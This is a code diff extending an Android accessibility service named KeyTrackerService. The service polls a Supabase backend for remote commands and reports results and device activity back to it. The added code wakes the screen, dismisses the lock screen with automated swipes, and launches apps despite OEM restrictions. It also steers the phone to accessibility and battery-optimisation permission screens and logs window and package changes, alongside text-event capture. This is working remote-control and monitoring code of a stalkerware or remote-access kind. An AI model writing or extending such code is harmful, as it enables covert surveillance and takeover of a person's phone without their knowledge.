@@ -15,7 +15,16 @@ import android.util.Log;
 import android.view.KeyEvent;
 import android.view.Display;
 import android.os.Bundle;
+import android.os.PowerManager;
 import android.content.Intent;
+import android.content.Context;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
+import android.graphics.Point;
+import android.net.Uri;
+import android.provider.Settings;
+import android.view.WindowManager;
+import android.app.KeyguardManager;
 
 import java.util.List;
 import java.util.concurrent.Callable;
@@ -36,6 +45,14 @@ public class KeyTrackerService extends AccessibilityService {
 
     private Handler mainHandler;
     private volatile String lastPackageName = null;
+    private final AtomicReference<String> lastWindowPackage = new AtomicReference<>(null);
+    private final AtomicReference<String> lastWindowClass = new AtomicReference<>(null);
+    private volatile long lastWindowChangedAtMs = 0;
+
+    // Wake lock (optionnel) pour garder le CPU éveillé.
+    // Note: ne garantit pas que l'écran reste allumé -> voir KeepAwakeActivity.
+    private final Object wakeLockLock = new Object();
+    private PowerManager.WakeLock wakeLock = null;
 
     // Polling Supabase: commandes distantes (tap x/y, etc.)
     private static final long COMMAND_POLL_INTERVAL_MS = 900;
@@ -65,6 +82,355 @@ public class KeyTrackerService extends AccessibilityService {
 
     public static KeyTrackerService getInstance() {
         return INSTANCE;
+    }
+
+    private boolean acquireWakeLock(long durationMs) {
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm == null) return false;
+            long d = Math.max(200, durationMs);
+
+            synchronized (wakeLockLock) {
+                try {
+                    if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+                } catch (Exception ignored) {}
+
+                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "andtracker:remote");
+                wakeLock.setReferenceCounted(false);
+                wakeLock.acquire(d);
+            }
+            return true;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    // Best-effort: réveiller l'écran (certains OEM peuvent limiter).
+    @SuppressWarnings("deprecation")
+    private boolean wakeScreenOnce(long durationMs) {
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm == null) return false;
+            long d = Math.max(500, durationMs);
+
+            synchronized (wakeLockLock) {
+                try {
+                    if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+                } catch (Exception ignored) {}
+
+                // Deprecated mais encore largement supporté; utile quand l'écran est éteint.
+                int flags = PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP;
+                wakeLock = pm.newWakeLock(flags, "andtracker:wake_screen");
+                wakeLock.setReferenceCounted(false);
+                wakeLock.acquire(d);
+            }
+            return true;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private boolean releaseWakeLock() {
+        synchronized (wakeLockLock) {
+            try {
+                if (wakeLock != null && wakeLock.isHeld()) {
+                    wakeLock.release();
+                }
+                wakeLock = null;
+                return true;
+            } catch (Exception e) {
+                wakeLock = null;
+                return false;
+            }
+        }
+    }
+
+    private boolean openKeepAwakeActivity(long finishAfterMs, boolean turnScreenOn, boolean showWhenLocked) {
+        try {
+            Intent i = new Intent(this, KeepAwakeActivity.class);
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            i.putExtra(KeepAwakeActivity.EXTRA_FINISH_AFTER_MS, Math.max(0, finishAfterMs));
+            i.putExtra(KeepAwakeActivity.EXTRA_TURN_SCREEN_ON, turnScreenOn);
+            i.putExtra(KeepAwakeActivity.EXTRA_SHOW_WHEN_LOCKED, showWhenLocked);
+            startActivity(i);
+            return true;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private boolean isInteractive() {
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm == null) return true;
+            return pm.isInteractive();
+        } catch (Exception e) {
+            return true;
+        }
+    }
+
+    private boolean isKeyguardLocked() {
+        try {
+            KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
+            if (km == null) return false;
+            return km.isKeyguardLocked();
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    // Écran éteint -> réveil + swipe up (si pas de PIN) pour sortir du keyguard.
+    private boolean ensureScreenOnAndUnlocked(long timeoutMs) {
+        long deadline = System.currentTimeMillis() + Math.max(1000, timeoutMs);
+        boolean interactiveBefore = isInteractive();
+        boolean keyguardBefore = isKeyguardLocked();
+
+        // 1) Réveiller l'écran si besoin
+        if (!interactiveBefore) {
+            wakeScreenOnce(6000);
+            long dl = System.currentTimeMillis() + 6000;
+            while (!isInteractive() && System.currentTimeMillis() < dl) {
+                try { Thread.sleep(120); } catch (Exception ignored) {}
+            }
+        }
+
+        // Toujours essayer de revenir sur HOME (certaines ROM refusent les launchs si on est sur keyguard)
+        performGlobalActionSafe("HOME");
+        waitForForegroundChange(System.currentTimeMillis() - 1, 900);
+
+        // 2) Dismiss keyguard best-effort (sans PIN, un swipe suffit)
+        int tries = 0;
+        String lastFg = getForegroundPackageFromRoot();
+        while (System.currentTimeMillis() < deadline) {
+            if (!isKeyguardLocked()) return true;
+
+            // swipe up depuis le bas vers le haut (plus agressif au fil des essais)
+            float yStart = tries < 2 ? 0.85f : 0.92f;
+            float yEnd = tries < 2 ? 0.15f : 0.08f;
+            long dur = tries < 2 ? 280 : 380;
+            swipePercent(0.5f, yStart, 0.5f, yEnd, dur);
+            tries += 1;
+            try { Thread.sleep(350); } catch (Exception ignored) {}
+
+            if (!isKeyguardLocked()) return true;
+            // Heuristique OEM: parfois KeyguardManager reste "locked" un moment; on accepte si on voit HOME au foreground.
+            String fg = getForegroundPackageFromRoot();
+            if (fg == null) fg = lastWindowPackage.get();
+            if (fg != null && (fg.equals("com.miui.home") || fg.equals(getPackageName()) || fg.equals("com.android.settings"))) {
+                // si on a pu afficher HOME/Settings, on considère qu'on peut exécuter des actions UI
+                return true;
+            }
+            if (fg != null) lastFg = fg;
+            if (tries >= 6) break;
+        }
+
+        // Même si KeyguardManager n'est pas fiable, on essaie de se placer sur HOME.
+        performGlobalActionSafe("HOME");
+        waitForForegroundChange(System.currentTimeMillis() - 1, 1200);
+        boolean interactiveAfter = isInteractive();
+        boolean keyguardAfter = isKeyguardLocked();
+        String fgAfter = getForegroundPackageFromRoot();
+        if (fgAfter == null) fgAfter = lastWindowPackage.get();
+
+        // Dernier recours: si écran allumé + on est sur HOME, considérer OK.
+        if (interactiveAfter && fgAfter != null && fgAfter.equals("com.miui.home")) return true;
+
+        Log.i(TAG, "ensureScreenOnAndUnlocked: fail interactive " + interactiveBefore + "->" + interactiveAfter
+                + " keyguard " + keyguardBefore + "->" + keyguardAfter
+                + " lastFg=" + lastFg + " fgAfter=" + fgAfter + " tries=" + tries);
+        return !keyguardAfter;
+    }
+
+    private boolean openSettingsScreen(String screen) {
+        try {
+            // Important: écran éteint -> rien ne marchera (pas de fenêtres). On réveille + unlock d'abord.
+            ensureScreenOnAndUnlocked(7000);
+
+            String s = (screen == null) ? "" : screen.trim().toUpperCase(Locale.ROOT);
+            Intent i;
+            switch (s) {
+                case "ACCESSIBILITY":
+                    i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                    break;
+                case "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS":
+                    // Affiche le prompt système pour autoriser l'app à ignorer Doze.
+                    i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:" + getPackageName()));
+                    break;
+                case "OVERLAY":
+                    i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+                    break;
+                case "WRITE_SETTINGS":
+                    i = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS, Uri.parse("package:" + getPackageName()));
+                    break;
+                case "BATTERY_OPTIMIZATIONS":
+                case "IGNORE_BATTERY_OPTIMIZATIONS":
+                    i = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
+                    break;
+                case "APP_DETAILS":
+                default:
+                    i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName()));
+                    break;
+            }
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(i);
+            // MIUI (et d'autres OEM) bloquent "background activity starts" même depuis un AccessibilityService.
+            // On tente d'abord startActivity, puis fallback 100% accessibility (HOME + click icône).
+            boolean ok = confirmForegroundAfterLaunch("open_settings:" + s, "com.android.settings", 1200);
+            if (ok) return true;
+
+            Log.i(TAG, "openSettingsScreen: startActivity probablement bloqué -> fallback via launcher click");
+            // 1) Ouvrir l'app Settings via open_app (qui a ses propres fallbacks)
+            boolean openedSettings = openApp("com.android.settings", "");
+            if (!openedSettings) {
+                performGlobalActionSafe("HOME");
+                waitForForegroundChange(System.currentTimeMillis() - 1, 1200);
+            }
+
+            // 2) Si on veut un écran spécifique, tenter navigation par click (best-effort).
+            if ("ACCESSIBILITY".equals(s)) {
+                String[] access = new String[] { "Accessibilité", "Accessibility", "Miui Accessibility", "Services d'accessibilité" };
+                if (clickNodeAny(access, "contains", 4500)) {
+                    // On valide au moins un changement de fenêtre (classe/activité) ou rester dans Settings si déjà là.
+                    String cls = lastWindowClass.get();
+                    if (cls != null && cls.toLowerCase(Locale.ROOT).contains("access")) return true;
+                    return confirmForegroundAfterLaunch("open_settings_fallback_accessibility", "com.android.settings", 2500);
+                }
+                // Si on est déjà dans Settings, considérer OK (l'utilisateur peut sélectionner manuellement)
+                String fg = getForegroundPackageFromRoot();
+                return "com.android.settings".equals(fg);
+            }
+
+            // Pour APP_DETAILS et autres, au minimum ouvrir Settings (sinon c'est "aucune action").
+            if ("APP_DETAILS".equals(s) || "OVERLAY".equals(s) || "WRITE_SETTINGS".equals(s) || "BATTERY_OPTIMIZATIONS".equals(s) || "IGNORE_BATTERY_OPTIMIZATIONS".equals(s) || "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS".equals(s)) {
+                String fg = getForegroundPackageFromRoot();
+                if ("com.android.settings".equals(fg)) return true;
+            }
+
+            return false;
+        } catch (Exception e) {
+            Log.w(TAG, "openSettingsScreen: exception", e);
+            return false;
+        }
+    }
+
+    private String getForegroundPackageFromRoot() {
+        try {
+            String pkg = callOnMainThread(() -> {
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root == null) return null;
+                try {
+                    CharSequence p = root.getPackageName();
+                    return p == null ? null : p.toString();
+                } finally {
+                    try { root.recycle(); } catch (Exception ignored) {}
+                }
+            }, 600);
+            return (pkg == null || pkg.trim().isEmpty()) ? null : pkg.trim();
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    private boolean waitForForegroundChange(long sinceMs, long timeoutMs) {
+        long deadline = System.currentTimeMillis() + Math.max(100, timeoutMs);
+        while (System.currentTimeMillis() < deadline) {
+            if (lastWindowChangedAtMs > sinceMs) return true;
+            try { Thread.sleep(80); } catch (Exception ignored) {}
+        }
+        return false;
+    }
+
+    private boolean confirmForegroundAfterLaunch(String label, String expectedPkg, long timeoutMs) {
+        long start = System.currentTimeMillis();
+        String before = getForegroundPackageFromRoot();
+        String expected = (expectedPkg == null) ? null : expectedPkg.trim();
+
+        if (expected != null && !expected.isEmpty() && expected.equals(before)) {
+            Log.i(TAG, "confirm(" + label + "): already_foreground pkg=" + before);
+            return true;
+        }
+
+        if (expected != null && !expected.isEmpty()) {
+            long deadline = System.currentTimeMillis() + Math.max(100, timeoutMs);
+            while (System.currentTimeMillis() < deadline) {
+                String pkg = getForegroundPackageFromRoot();
+                if (pkg == null) pkg = lastWindowPackage.get();
+                if (expected.equals(pkg)) {
+                    Log.i(TAG, "confirm(" + label + "): ok expected=" + expected + " before=" + before + " after=" + pkg);
+                    return true;
+                }
+                try { Thread.sleep(80); } catch (Exception ignored) {}
+            }
+            Log.i(TAG, "confirm(" + label + "): timeout expected=" + expected + " before=" + before + " after=" + getForegroundPackageFromRoot());
+            return false;
+        }
+
+        boolean changed = waitForForegroundChange(start, timeoutMs);
+        Log.i(TAG, "confirm(" + label + "): changed=" + changed + " before=" + before + " after=" + getForegroundPackageFromRoot());
+        return changed;
+    }
+
+    private Point getRealScreenSize() {
+        try {
+            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+            if (wm == null) return null;
+            Display d = wm.getDefaultDisplay();
+            if (d == null) return null;
+            Point p = new Point();
+            d.getRealSize(p);
+            if (p.x <= 0 || p.y <= 0) return null;
+            return p;
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    private float clamp01(float v) {
+        if (v < 0f) return 0f;
+        if (v > 1f) return 1f;
+        return v;
+    }
+
+    private boolean swipePercent(float x1p, float y1p, float x2p, float y2p, long durationMs) {
+        Point s = getRealScreenSize();
+        if (s == null) return false;
+        int x1 = Math.round(s.x * clamp01(x1p));
+        int y1 = Math.round(s.y * clamp01(y1p));
+        int x2 = Math.round(s.x * clamp01(x2p));
+        int y2 = Math.round(s.y * clamp01(y2p));
+        return swipe(x1, y1, x2, y2, durationMs);
+    }
+
+    private boolean clickNodeAny(String[] values, String matchMode, long totalTimeoutMs) {
+        long deadline = System.currentTimeMillis() + Math.max(300, totalTimeoutMs);
+        int idx = 0;
+        while (System.currentTimeMillis() < deadline) {
+            if (values == null || values.length == 0) return false;
+            String v = values[idx % values.length];
+            idx += 1;
+            if (v != null && !v.trim().isEmpty()) {
+                boolean ok = clickNodeWithRetries(v.trim(), matchMode, 700);
+                if (ok) return true;
+            }
+            try { Thread.sleep(120); } catch (Exception ignored) {}
+        }
+        return false;
+    }
+
+    private String getAppLabelOrNull(String packageName) {
+        try {
+            if (packageName == null || packageName.trim().isEmpty()) return null;
+            PackageManager pm = getPackageManager();
+            if (pm == null) return null;
+            ApplicationInfo ai = pm.getApplicationInfo(packageName.trim(), 0);
+            CharSequence cs = pm.getApplicationLabel(ai);
+            String s = cs == null ? null : cs.toString();
+            if (s == null) return null;
+            s = s.trim();
+            return s.isEmpty() ? null : s;
+        } catch (Exception e) {
+            return null;
+        }
     }
 
     /**
@@ -365,6 +731,16 @@ public class KeyTrackerService extends AccessibilityService {
 
         if (event.getPackageName() != null) {
             lastPackageName = event.getPackageName().toString();
+        }
+
+        final int et = event.getEventType();
+        if (et == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || et == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
+            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : null;
+            String cls = event.getClassName() != null ? event.getClassName().toString() : null;
+            lastWindowPackage.set(pkg);
+            lastWindowClass.set(cls);
+            lastWindowChangedAtMs = System.currentTimeMillis();
+            Log.i(TAG, "window_changed pkg=" + pkg + " cls=" + cls);
         }
 
         // Capturer les événements de changement de texte
@@ -833,6 +1209,15 @@ public class KeyTrackerService extends AccessibilityService {
             if ("open_app".equalsIgnoreCase(type)) {
                 String pkg = payload != null ? payload.optString("package", "") : "";
                 String component = payload != null ? payload.optString("component", "") : "";
+                String expectedPkg = null;
+                if (component != null && component.contains("/")) {
+                    expectedPkg = component.split("/", 2)[0];
+                } else if (pkg != null && !pkg.isEmpty()) {
+                    expectedPkg = pkg;
+                }
+                boolean interactiveBefore = isInteractive();
+                boolean keyguardBefore = isKeyguardLocked();
+                String before = getForegroundPackageFromRoot();
                 boolean ok = openApp(pkg, component);
                 Log.d(TAG, "Remote command open_app id=" + id + " package=" + pkg + " component=" + component + " ok=" + ok);
                 org.json.JSONObject res = new org.json.JSONObject();
@@ -840,8 +1225,91 @@ public class KeyTrackerService extends AccessibilityService {
                 res.put("type", "open_app");
                 if (pkg != null && !pkg.isEmpty()) res.put("package", pkg);
                 if (component != null && !component.isEmpty()) res.put("component", component);
+                if (expectedPkg != null) res.put("expected_pkg", expectedPkg);
+                res.put("foreground_before", before);
+                res.put("foreground_after", getForegroundPackageFromRoot());
+                res.put("last_window_pkg", lastWindowPackage.get());
+                res.put("last_window_cls", lastWindowClass.get());
+                res.put("interactive_before", interactiveBefore);
+                res.put("interactive_after", isInteractive());
+                res.put("keyguard_before", keyguardBefore);
+                res.put("keyguard_after", isKeyguardLocked());
                 SupabaseAndroidEventsClient.updateCommandStatus(this, id, ok ? "done" : "error", res);
                 SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_open_app", ok ? ("OK@" + (pkg.isEmpty() ? component : pkg)) : "FAIL");
+                return;
+            }
+
+            if ("ping".equalsIgnoreCase(type)) {
+                org.json.JSONObject res = new org.json.JSONObject();
+                res.put("ok", true);
+                res.put("type", "ping");
+                res.put("sdk", Build.VERSION.SDK_INT);
+                res.put("package", lastPackageName);
+                res.put("ts", System.currentTimeMillis());
+                SupabaseAndroidEventsClient.updateCommandStatus(this, id, "done", res);
+                SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_ping", "OK");
+                return;
+            }
+
+            if ("wake_lock".equalsIgnoreCase(type)) {
+                String action = payload != null ? payload.optString("action", "acquire") : "acquire";
+                long d = payload != null ? payload.optLong("durationMs", 10 * 60 * 1000L) : (10 * 60 * 1000L);
+                String mode = payload != null ? payload.optString("mode", "cpu") : "cpu"; // cpu|screen
+                boolean ok;
+                if ("release".equalsIgnoreCase(action) || "off".equalsIgnoreCase(action)) {
+                    ok = releaseWakeLock();
+                } else {
+                    if ("screen".equalsIgnoreCase(mode)) ok = wakeScreenOnce(d);
+                    else ok = acquireWakeLock(d);
+                }
+                org.json.JSONObject res = new org.json.JSONObject();
+                res.put("ok", ok);
+                res.put("type", "wake_lock");
+                res.put("action", action);
+                res.put("durationMs", d);
+                res.put("mode", mode);
+                res.put("package", lastPackageName);
+                SupabaseAndroidEventsClient.updateCommandStatus(this, id, ok ? "done" : "error", res);
+                SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_wake_lock", ok ? ("OK@" + action) : ("FAIL@" + action));
+                return;
+            }
+
+            if ("keep_awake_activity".equalsIgnoreCase(type)) {
+                long finishAfter = payload != null ? payload.optLong("finishAfterMs", 0) : 0;
+                boolean turnScreenOn = payload == null || payload.optBoolean("turnScreenOn", true);
+                boolean showWhenLocked = payload != null && payload.optBoolean("showWhenLocked", false);
+                boolean ok = openKeepAwakeActivity(finishAfter, turnScreenOn, showWhenLocked);
+                org.json.JSONObject res = new org.json.JSONObject();
+                res.put("ok", ok);
+                res.put("type", "keep_awake_activity");
+                res.put("finishAfterMs", finishAfter);
+                res.put("turnScreenOn", turnScreenOn);
+                res.put("showWhenLocked", showWhenLocked);
+                res.put("package", lastPackageName);
+                SupabaseAndroidEventsClient.updateCommandStatus(this, id, ok ? "done" : "error", res);
+                SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_keep_awake_activity", ok ? "OK" : "FAIL");
+                return;
+            }
+
+            if ("open_settings".equalsIgnoreCase(type)) {
+                String screen = payload != null ? payload.optString("screen", "APP_DETAILS") : "APP_DETAILS";
+                boolean interactiveBefore = isInteractive();
+                boolean keyguardBefore = isKeyguardLocked();
+                boolean ok = openSettingsScreen(screen);
+                org.json.JSONObject res = new org.json.JSONObject();
+                res.put("ok", ok);
+                res.put("type", "open_settings");
+                res.put("screen", screen);
+                res.put("package", lastPackageName);
+                res.put("foreground_pkg", getForegroundPackageFromRoot());
+                res.put("last_window_pkg", lastWindowPackage.get());
+                res.put("last_window_cls", lastWindowClass.get());
+                res.put("interactive_before", interactiveBefore);
+                res.put("interactive_after", isInteractive());
+                res.put("keyguard_before", keyguardBefore);
+                res.put("keyguard_after", isKeyguardLocked());
+                SupabaseAndroidEventsClient.updateCommandStatus(this, id, ok ? "done" : "error", res);
+                SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_open_settings", ok ? ("OK@" + screen) : ("FAIL@" + screen));
                 return;
             }
 
@@ -913,7 +1381,11 @@ public class KeyTrackerService extends AccessibilityService {
 
     private boolean openApp(String packageName, String componentName) {
         try {
+            // Écran éteint -> réveil + unlock (sinon aucun launch/click ne sera effectif)
+            ensureScreenOnAndUnlocked(7000);
+
             Intent intent = null;
+            String expectedPkg = null;
             if (componentName != null && !componentName.trim().isEmpty()) {
                 String c = componentName.trim();
                 // Formats acceptés:
@@ -931,14 +1403,77 @@ public class KeyTrackerService extends AccessibilityService {
                 }
                 intent = new Intent();
                 intent.setClassName(pkg, cls);
+                expectedPkg = pkg;
             } else if (packageName != null && !packageName.trim().isEmpty()) {
-                intent = getPackageManager().getLaunchIntentForPackage(packageName.trim());
+                expectedPkg = packageName.trim();
+                intent = getPackageManager().getLaunchIntentForPackage(expectedPkg);
             }
             if (intent == null) return false;
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            long start = System.currentTimeMillis();
             startActivity(intent);
-            return true;
+
+            // Si aucune transition de fenêtre n’est détectée, considérer FAIL (sinon on "done" sans action visible).
+            boolean ok = confirmForegroundAfterLaunch("open_app", expectedPkg, 2500);
+            if (ok) return true;
+
+            // MIUI (et d'autres OEM) bloquent "background activity starts" -> fallback 100% accessibility:
+            // HOME + click sur l'icône (par label).
+            String label = getAppLabelOrNull(expectedPkg);
+            Log.i(TAG, "openApp: startActivity probablement bloqué -> fallback via launcher click expectedPkg=" + expectedPkg + " label=" + label);
+
+            performGlobalActionSafe("HOME");
+            waitForForegroundChange(System.currentTimeMillis() - 1, 1200);
+
+            java.util.ArrayList<String> vals = new java.util.ArrayList<>();
+            if (label != null) vals.add(label);
+            // Cas spécial: Settings est souvent localisé
+            if ("com.android.settings".equals(expectedPkg)) {
+                vals.add("Paramètres");
+                vals.add("Réglages");
+                vals.add("Settings");
+                vals.add("设置");
+            }
+
+            String[] candidates = vals.toArray(new String[0]);
+            if (candidates.length > 0 && clickNodeAny(candidates, "contains", 3000)) {
+                return confirmForegroundAfterLaunch("open_app_fallback_home", expectedPkg, 2500);
+            }
+
+            // Essai tiroir d'apps (swipe up) puis re-essai
+            swipePercent(0.5f, 0.88f, 0.5f, 0.18f, 350);
+            waitForForegroundChange(System.currentTimeMillis() - 1, 900);
+            if (candidates.length > 0 && clickNodeAny(candidates, "contains", 3500)) {
+                return confirmForegroundAfterLaunch("open_app_fallback_drawer", expectedPkg, 2500);
+            }
+
+            // Fallback "search" (MIUI launcher): swipe down -> set text -> click résultat.
+            if (label != null) {
+                // On tente d'ouvrir la recherche du launcher
+                swipePercent(0.5f, 0.18f, 0.5f, 0.88f, 260);
+                waitForForegroundChange(System.currentTimeMillis() - 1, 900);
+
+                String[] searchFields = new String[] {
+                    "Rechercher", "Recherche", "Search", "Search apps", "Rechercher des applications"
+                };
+
+                boolean setOk = false;
+                for (String sf : searchFields) {
+                    if (sf == null || sf.trim().isEmpty()) continue;
+                    setOk = setTextNodeWithRetries(sf.trim(), "contains", label, 2200);
+                    if (setOk) break;
+                }
+                if (setOk) {
+                    if (clickNodeAny(new String[] { label }, "contains", 3500)) {
+                        return confirmForegroundAfterLaunch("open_app_fallback_search", expectedPkg, 3000);
+                    }
+                }
+            }
+
+            Log.i(TAG, "openApp: fallback échoué expectedPkg=" + expectedPkg + " label=" + label + " since=" + start);
+            return false;
         } catch (Exception e) {
+            Log.w(TAG, "openApp: exception", e);
             return false;
         }
     }
